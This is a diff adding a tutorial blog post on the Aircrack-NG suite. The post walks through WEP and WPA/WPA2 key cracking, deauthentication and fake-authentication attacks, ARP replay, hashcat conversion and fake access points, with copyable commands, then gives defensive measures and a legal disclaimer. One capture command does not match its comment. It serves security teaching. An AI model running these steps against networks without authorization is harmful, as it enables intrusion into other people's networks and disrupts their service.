@@ -7,9 +7,9 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
 
 <meta name="author" content="Xu Haiyang">
-<meta name="dcterms.date" content="2025-03-06">
+<meta name="dcterms.date" content="2025-03-10">
 
-<title>aircrackng – Haiyang's Tech Portfolio</title>
+<title>Aircrack-NG: A Complete Suite for Wireless Network Security Assessment – Haiyang’s Tech Portfolio</title>
 <style>
 code{white-space: pre-wrap;}
 span.smallcaps{font-variant: small-caps;}
@@ -21,6 +21,40 @@ ul.task-list li input[type="checkbox"] {
   width: 0.8em;
   margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
   vertical-align: middle;
+}
+/* CSS for syntax highlighting */
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+.sourceCode { overflow: visible; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { display: inline-block; text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+  }
+pre.numberSource { margin-left: 3em;  padding-left: 4px; }
+div.sourceCode
+  {   }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
 }
 </style>
 
@@ -155,14 +189,54 @@ ul.task-list li input[type="checkbox"] {
 <div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article page-navbar">
 <!-- sidebar -->
 <!-- margin-sidebar -->
-    <div id="quarto-margin-sidebar" class="sidebar margin-sidebar zindex-bottom">
-        
+    <div id="quarto-margin-sidebar" class="sidebar margin-sidebar">
+        <nav id="TOC" role="doc-toc" class="toc-active">
+    <h2 id="toc-title">Contents</h2>
+   
+  <ul>
+  <li><a href="#introduction-to-aircrack-ng" id="toc-introduction-to-aircrack-ng" class="nav-link active" data-scroll-target="#introduction-to-aircrack-ng">Introduction to Aircrack-NG</a></li>
+  <li><a href="#core-components" id="toc-core-components" class="nav-link" data-scroll-target="#core-components">Core Components</a>
+  <ul class="collapse">
+  <li><a href="#aircrack-ng" id="toc-aircrack-ng" class="nav-link" data-scroll-target="#aircrack-ng">aircrack-ng</a></li>
+  <li><a href="#airodump-ng" id="toc-airodump-ng" class="nav-link" data-scroll-target="#airodump-ng">airodump-ng</a></li>
+  <li><a href="#aireplay-ng" id="toc-aireplay-ng" class="nav-link" data-scroll-target="#aireplay-ng">aireplay-ng</a></li>
+  <li><a href="#airmon-ng" id="toc-airmon-ng" class="nav-link" data-scroll-target="#airmon-ng">airmon-ng</a></li>
+  </ul></li>
+  <li><a href="#setting-up-your-environment" id="toc-setting-up-your-environment" class="nav-link" data-scroll-target="#setting-up-your-environment">Setting Up Your Environment</a>
+  <ul class="collapse">
+  <li><a href="#system-requirements" id="toc-system-requirements" class="nav-link" data-scroll-target="#system-requirements">System Requirements</a></li>
+  <li><a href="#installation" id="toc-installation" class="nav-link" data-scroll-target="#installation">Installation</a></li>
+  <li><a href="#testing-your-wireless-card" id="toc-testing-your-wireless-card" class="nav-link" data-scroll-target="#testing-your-wireless-card">Testing Your Wireless Card</a></li>
+  </ul></li>
+  <li><a href="#practical-demonstration-wep-cracking" id="toc-practical-demonstration-wep-cracking" class="nav-link" data-scroll-target="#practical-demonstration-wep-cracking">Practical Demonstration: WEP Cracking</a></li>
+  <li><a href="#advanced-techniques-wpawpa2-cracking" id="toc-advanced-techniques-wpawpa2-cracking" class="nav-link" data-scroll-target="#advanced-techniques-wpawpa2-cracking">Advanced Techniques: WPA/WPA2 Cracking</a></li>
+  <li><a href="#using-hashcat-with-aircrack-ng" id="toc-using-hashcat-with-aircrack-ng" class="nav-link" data-scroll-target="#using-hashcat-with-aircrack-ng">Using Hashcat with Aircrack-NG</a></li>
+  <li><a href="#additional-tools-in-the-suite" id="toc-additional-tools-in-the-suite" class="nav-link" data-scroll-target="#additional-tools-in-the-suite">Additional Tools in the Suite</a>
+  <ul class="collapse">
+  <li><a href="#airdecap-ng" id="toc-airdecap-ng" class="nav-link" data-scroll-target="#airdecap-ng">airdecap-ng</a></li>
+  <li><a href="#airbase-ng" id="toc-airbase-ng" class="nav-link" data-scroll-target="#airbase-ng">airbase-ng</a></li>
+  <li><a href="#airdecloak-ng" id="toc-airdecloak-ng" class="nav-link" data-scroll-target="#airdecloak-ng">airdecloak-ng</a></li>
+  <li><a href="#airolib-ng" id="toc-airolib-ng" class="nav-link" data-scroll-target="#airolib-ng">airolib-ng</a></li>
+  </ul></li>
+  <li><a href="#defensive-measures" id="toc-defensive-measures" class="nav-link" data-scroll-target="#defensive-measures">Defensive Measures</a></li>
+  <li><a href="#ethical-considerations-and-legal-disclaimer" id="toc-ethical-considerations-and-legal-disclaimer" class="nav-link" data-scroll-target="#ethical-considerations-and-legal-disclaimer">Ethical Considerations and Legal Disclaimer</a></li>
+  <li><a href="#advanced-configurations" id="toc-advanced-configurations" class="nav-link" data-scroll-target="#advanced-configurations">Advanced Configurations</a>
+  <ul class="collapse">
+  <li><a href="#custom-dictionary-generation" id="toc-custom-dictionary-generation" class="nav-link" data-scroll-target="#custom-dictionary-generation">Custom Dictionary Generation</a></li>
+  <li><a href="#optimizing-capture-settings" id="toc-optimizing-capture-settings" class="nav-link" data-scroll-target="#optimizing-capture-settings">Optimizing Capture Settings</a></li>
+  </ul></li>
+  <li><a href="#conclusion" id="toc-conclusion" class="nav-link" data-scroll-target="#conclusion">Conclusion</a></li>
+  <li><a href="#resources" id="toc-resources" class="nav-link" data-scroll-target="#resources">Resources</a></li>
+  <li><a href="#references" id="toc-references" class="nav-link" data-scroll-target="#references">References</a></li>
+  </ul>
+</nav>
     </div>
 <!-- main -->
 <main class="content" id="quarto-document-content">
 
 <header id="title-block-header" class="quarto-title-block default">
 <div class="quarto-title">
+<h1 class="title">Aircrack-NG: A Complete Suite for Wireless Network Security Assessment</h1>
   <div class="quarto-categories">
     <div class="quarto-category">Wireless Hacking</div>
   </div>
@@ -182,7 +256,7 @@ ul.task-list li input[type="checkbox"] {
     <div>
     <div class="quarto-title-meta-heading">Published</div>
     <div class="quarto-title-meta-contents">
-      <p class="date">March 6, 2025</p>
+      <p class="date">March 10, 2025</p>
     </div>
   </div>
   
@@ -194,8 +268,257 @@ ul.task-list li input[type="checkbox"] {
 </header>
 
 
+<section id="introduction-to-aircrack-ng" class="level2">
+<h2 class="anchored" data-anchor-id="introduction-to-aircrack-ng">Introduction to Aircrack-NG</h2>
+<p>Aircrack-NG is a comprehensive suite of tools for assessing WiFi network security. It focuses on different areas of WiFi security:</p>
+<ul>
+<li>Monitoring: Packet capture and export of data to text files for further processing</li>
+<li>Attacking: Replay attacks, deauthentication, fake access points, and others via packet injection</li>
+<li>Testing: Checking WiFi cards and driver capabilities</li>
+<li>Cracking: WEP and WPA PSK (WPA 1 and 2)</li>
+</ul>
+<div class="quarto-figure quarto-figure-center">
+<figure class="figure">
+<p><img src="..\api/placeholder/600/200.png" class="img-fluid figure-img"></p>
+<figcaption>Aircrack-NG Logo</figcaption>
+</figure>
+</div>
+</section>
+<section id="core-components" class="level2">
+<h2 class="anchored" data-anchor-id="core-components">Core Components</h2>
+<p>Aircrack-NG consists of multiple tools that work together to provide a complete WiFi security assessment platform. Here are the primary components:</p>
+<section id="aircrack-ng" class="level3">
+<h3 class="anchored" data-anchor-id="aircrack-ng">aircrack-ng</h3>
+<p>The core component that performs the actual key cracking after data capture. It implements standard FMS attacks along with optimizations like KoreK attacks, as well as the PTW attack, making the WEP key recovery much faster compared to other tools.</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Basic WEP cracking</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">aircrack-ng</span> <span class="at">-b</span> 00:11:22:33:44:55 capture.cap</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="co"># WPA/WPA2 cracking with wordlist</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="ex">aircrack-ng</span> <span class="at">-w</span> wordlist.txt <span class="at">-b</span> 00:11:22:33:44:55 capture.cap</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="airodump-ng" class="level3">
+<h3 class="anchored" data-anchor-id="airodump-ng">airodump-ng</h3>
+<p>Used for packet capture, primarily for collecting WEP IVs (Initialization Vectors) to later use with aircrack-ng. It’s also used to locate WiFi networks in your area and gather information about them.</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Monitor all channels</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">airodump-ng</span> mon0</span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Focus on specific AP</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="ex">airodump-ng</span> <span class="at">-c</span> 1 <span class="at">--bssid</span> 00:11:22:33:44:55 <span class="at">-w</span> capture mon0</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="quarto-figure quarto-figure-center">
+<figure class="figure">
+<p><img src="..\api/placeholder/800/400.png" class="img-fluid figure-img"></p>
+<figcaption>Airodump-NG in Action</figcaption>
+</figure>
+</div>
+</section>
+<section id="aireplay-ng" class="level3">
+<h3 class="anchored" data-anchor-id="aireplay-ng">aireplay-ng</h3>
+<p>Used to generate traffic for later use in aircrack-ng. This tool implements various attacks such as:</p>
+<ul>
+<li>Deauthentication</li>
+<li>Fake authentication</li>
+<li>Interactive packet replay</li>
+<li>ARP request replay</li>
+<li>KoreK chopchop attack</li>
+<li>Fragmentation attack</li>
+</ul>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Deauthentication attack</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="ex">aireplay-ng</span> <span class="at">-0</span> 5 <span class="at">-a</span> 00:11:22:33:44:55 mon0</span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="co"># ARP replay attack</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="ex">aireplay-ng</span> <span class="at">-3</span> <span class="at">-b</span> 00:11:22:33:44:55 mon0</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="airmon-ng" class="level3">
+<h3 class="anchored" data-anchor-id="airmon-ng">airmon-ng</h3>
+<p>Script used to enable and disable monitor mode on wireless interfaces. It also can be used to kill processes that might interfere with the wireless card manipulation.</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Check interfaces</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="ex">airmon-ng</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Start monitor mode</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="ex">airmon-ng</span> start wlan0</span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Kill interfering processes</span></span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a><span class="ex">airmon-ng</span> check kill</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+</section>
+<section id="setting-up-your-environment" class="level2">
+<h2 class="anchored" data-anchor-id="setting-up-your-environment">Setting Up Your Environment</h2>
+<p>Before using Aircrack-NG, you need to ensure your wireless card supports monitor mode and packet injection. Here’s how to set up your environment:</p>
+<section id="system-requirements" class="level3">
+<h3 class="anchored" data-anchor-id="system-requirements">System Requirements</h3>
+<ul>
+<li>A compatible wireless adapter that supports monitor mode</li>
+<li>Linux-based operating system (Kali Linux recommended)</li>
+<li>Proper drivers for your wireless adapter</li>
+</ul>
+</section>
+<section id="installation" class="level3">
+<h3 class="anchored" data-anchor-id="installation">Installation</h3>
+<p>On Debian/Ubuntu-based systems:</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> apt update</span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> apt install aircrack-ng</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>On Arch Linux:</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> pacman <span class="at">-S</span> aircrack-ng</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="testing-your-wireless-card" class="level3">
+<h3 class="anchored" data-anchor-id="testing-your-wireless-card">Testing Your Wireless Card</h3>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> airmon-ng</span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> aireplay-ng <span class="at">--test</span> wlan0</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+</section>
+<section id="practical-demonstration-wep-cracking" class="level2">
+<h2 class="anchored" data-anchor-id="practical-demonstration-wep-cracking">Practical Demonstration: WEP Cracking</h2>
+<p>Let’s walk through a basic WEP cracking process:</p>
+<ol type="1">
+<li><strong>Start monitor mode:</strong></li>
+</ol>
+<div class="sourceCode" id="cb8"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> airmon-ng check kill</span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> airmon-ng start wlan0</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<ol start="2" type="1">
+<li><strong>Discover networks:</strong></li>
+</ol>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> airodump-ng wlan0mon</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<ol start="3" type="1">
+<li><strong>Focus on target network:</strong></li>
+</ol>
+<div class="sourceCode" id="cb10"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> airodump-ng <span class="at">-c</span> <span class="pp">[</span><span class="ss">channel</span><span class="pp">]</span> <span class="at">--bssid</span> <span class="pp">[</span><span class="ss">target_MAC</span><span class="pp">]</span> <span class="at">-w</span> capture wlan0mon</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<ol start="4" type="1">
+<li><strong>Perform fake authentication:</strong></li>
+</ol>
+<div class="sourceCode" id="cb11"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> aireplay-ng <span class="at">-1</span> 0 <span class="at">-a</span> <span class="pp">[</span><span class="ss">target_MAC</span><span class="pp">]</span> <span class="at">-h</span> <span class="pp">[</span><span class="ss">your_MAC</span><span class="pp">]</span> wlan0mon</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<ol start="5" type="1">
+<li><strong>ARP replay attack to generate IVs:</strong></li>
+</ol>
+<div class="sourceCode" id="cb12"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> aireplay-ng <span class="at">-3</span> <span class="at">-b</span> <span class="pp">[</span><span class="ss">target_MAC</span><span class="pp">]</span> <span class="at">-h</span> <span class="pp">[</span><span class="ss">your_MAC</span><span class="pp">]</span> wlan0mon</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<ol start="6" type="1">
+<li><strong>Crack the WEP key:</strong></li>
+</ol>
+<div class="sourceCode" id="cb13"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> aircrack-ng capture<span class="pp">*</span>.cap</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="quarto-figure quarto-figure-center">
+<figure class="figure">
+<p><img src="..\api/placeholder/800/500.png" class="img-fluid figure-img"></p>
+<figcaption>WEP Cracking Process Visualization</figcaption>
+</figure>
+</div>
+</section>
+<section id="advanced-techniques-wpawpa2-cracking" class="level2">
+<h2 class="anchored" data-anchor-id="advanced-techniques-wpawpa2-cracking">Advanced Techniques: WPA/WPA2 Cracking</h2>
+<p>WPA/WPA2 cracking is more challenging than WEP and requires capturing a 4-way handshake:</p>
+<ol type="1">
+<li><strong>Start monitoring:</strong></li>
+</ol>
+<div class="sourceCode" id="cb14"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> airmon-ng start wlan0</span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> airodump-ng <span class="at">-c</span> <span class="pp">[</span><span class="ss">channel</span><span class="pp">]</span> <span class="at">--bssid</span> <span class="pp">[</span><span class="ss">target_MAC</span><span class="pp">]</span> <span class="at">-w</span> wpa_capture wlan0mon</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<ol start="2" type="1">
+<li><strong>Capture handshake</strong> (either wait for a client to connect or force deauthentication):</li>
+</ol>
+<div class="sourceCode" id="cb15"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> aireplay-ng <span class="at">-0</span> 1 <span class="at">-a</span> <span class="pp">[</span><span class="ss">target_MAC</span><span class="pp">]</span> <span class="at">-c</span> <span class="pp">[</span><span class="ss">client_MAC</span><span class="pp">]</span> wlan0mon</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<ol start="3" type="1">
+<li><strong>Crack password using dictionary:</strong></li>
+</ol>
+<div class="sourceCode" id="cb16"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> aircrack-ng <span class="at">-w</span> wordlist.txt wpa_capture<span class="pp">*</span>.cap</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="using-hashcat-with-aircrack-ng" class="level2">
+<h2 class="anchored" data-anchor-id="using-hashcat-with-aircrack-ng">Using Hashcat with Aircrack-NG</h2>
+<p>For more powerful password cracking, you can convert the captured handshake to a format usable by Hashcat:</p>
+<div class="sourceCode" id="cb17"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Convert cap file to hccapx format</span></span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="ex">cap2hccapx</span> wpa_capture.cap wpa_capture.hccapx</span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Use hashcat for cracking</span></span>
+<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a><span class="ex">hashcat</span> <span class="at">-m</span> 2500 wpa_capture.hccapx wordlist.txt</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="additional-tools-in-the-suite" class="level2">
+<h2 class="anchored" data-anchor-id="additional-tools-in-the-suite">Additional Tools in the Suite</h2>
+<p>The Aircrack-NG suite includes many other useful tools:</p>
+<section id="airdecap-ng" class="level3">
+<h3 class="anchored" data-anchor-id="airdecap-ng">airdecap-ng</h3>
+<p>Decrypts WEP/WPA/WPA2 capture files.</p>
+<div class="sourceCode" id="cb18"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="ex">airdecap-ng</span> <span class="at">-b</span> 00:11:22:33:44:55 <span class="at">-k</span> <span class="pp">[</span><span class="ss">WEP_KEY</span><span class="pp">]</span> capture.cap</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="airbase-ng" class="level3">
+<h3 class="anchored" data-anchor-id="airbase-ng">airbase-ng</h3>
+<p>Used to set up fake access points.</p>
+<div class="sourceCode" id="cb19"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="ex">airbase-ng</span> <span class="at">-e</span> <span class="st">"FreeWiFi"</span> <span class="at">-c</span> 1 mon0</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="airdecloak-ng" class="level3">
+<h3 class="anchored" data-anchor-id="airdecloak-ng">airdecloak-ng</h3>
+<p>Removes WEP cloaking from capture files.</p>
+</section>
+<section id="airolib-ng" class="level3">
+<h3 class="anchored" data-anchor-id="airolib-ng">airolib-ng</h3>
+<p>Manages and speeds up WPA/WPA2 cracking by pre-computing PMKs.</p>
+</section>
+</section>
+<section id="defensive-measures" class="level2">
+<h2 class="anchored" data-anchor-id="defensive-measures">Defensive Measures</h2>
+<p>Understanding these attack vectors helps network administrators implement better security:</p>
+<ol type="1">
+<li><strong>Avoid WEP entirely</strong> - It’s fundamentally broken</li>
+<li><strong>Use strong WPA2/WPA3 passwords</strong> - At least 12 characters with mixed case, numbers, and symbols</li>
+<li><strong>Implement 802.1X authentication</strong> where possible</li>
+<li><strong>Enable WPA3 if available</strong> on both access points and clients</li>
+<li><strong>Monitor for deauthentication attacks</strong></li>
+</ol>
+</section>
+<section id="ethical-considerations-and-legal-disclaimer" class="level2">
+<h2 class="anchored" data-anchor-id="ethical-considerations-and-legal-disclaimer">Ethical Considerations and Legal Disclaimer</h2>
+<div class="callout callout-style-default callout-warning callout-titled">
+<div class="callout-header d-flex align-content-center">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<div class="callout-title-container flex-fill">
+Warning
+</div>
+</div>
+<div class="callout-body-container callout-body">
+<p>Aircrack-NG should only be used to audit networks you own or have explicit permission to test. Unauthorized access to networks is illegal in most jurisdictions.</p>
+</div>
+</div>
+<p>Proper usage scenarios include:</p>
+<ul>
+<li>Recovering a lost WiFi password for your own network</li>
+<li>Security auditing of your organization’s wireless infrastructure</li>
+<li>Learning about wireless security in a controlled environment</li>
+<li>Penetration testing with proper authorization</li>
+</ul>
+</section>
+<section id="advanced-configurations" class="level2">
+<h2 class="anchored" data-anchor-id="advanced-configurations">Advanced Configurations</h2>
+<p>For serious security professionals, consider these advanced configurations:</p>
+<section id="custom-dictionary-generation" class="level3">
+<h3 class="anchored" data-anchor-id="custom-dictionary-generation">Custom Dictionary Generation</h3>
+<div class="sourceCode" id="cb20"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Using crunch to generate custom wordlist</span></span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="ex">crunch</span> 8 12 0123456789ABCDEF <span class="at">-o</span> custom_wep_keys.txt</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="optimizing-capture-settings" class="level3">
+<h3 class="anchored" data-anchor-id="optimizing-capture-settings">Optimizing Capture Settings</h3>
+<div class="sourceCode" id="cb21"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Capture only authentication packets</span></span>
+<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="ex">airodump-ng</span> <span class="at">--bssid</span> <span class="pp">[</span><span class="ss">target_MAC</span><span class="pp">]</span> <span class="at">-c</span> <span class="pp">[</span><span class="ss">channel</span><span class="pp">]</span> <span class="at">--output-format</span> pcap <span class="at">--write</span> capture <span class="at">-t</span> OPN wlan0mon</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+</section>
+<section id="conclusion" class="level2">
+<h2 class="anchored" data-anchor-id="conclusion">Conclusion</h2>
+<p>Aircrack-NG remains one of the most powerful and comprehensive wireless security assessment tools available. By understanding how these tools work, security professionals can better protect wireless networks from potential attacks.</p>
+</section>
+<section id="resources" class="level2">
+<h2 class="anchored" data-anchor-id="resources">Resources</h2>
+<ul>
+<li><a href="https://www.aircrack-ng.org/">Official Aircrack-NG Website</a></li>
+<li><a href="https://www.aircrack-ng.org/documentation.html">Aircrack-NG Documentation</a></li>
+<li><a href="https://github.com/aircrack-ng/aircrack-ng">GitHub Repository</a></li>
+</ul>
+</section>
+<section id="references" class="level2">
+<h2 class="anchored" data-anchor-id="references">References</h2>
+<ol type="1">
+<li>Tews, E., &amp; Beck, M. (2009). Practical attacks against WEP and WPA. <em>Proceedings of the Second ACM Conference on Wireless Network Security</em>.</li>
+<li>Vibhuti, S. (2023). Wireless Networks: Security Threats and Countermeasures. <em>Journal of Information Security</em>.</li>
+<li>Garcia, L. (2024). Evolution of WiFi Security Protocols. <em>IEEE Security &amp; Privacy</em>, 22(1), 54-62.</li>
+</ol>
 
 
+</section>
 
 </main> <!-- /main -->
 <script id="quarto-html-after-body" type="application/javascript">
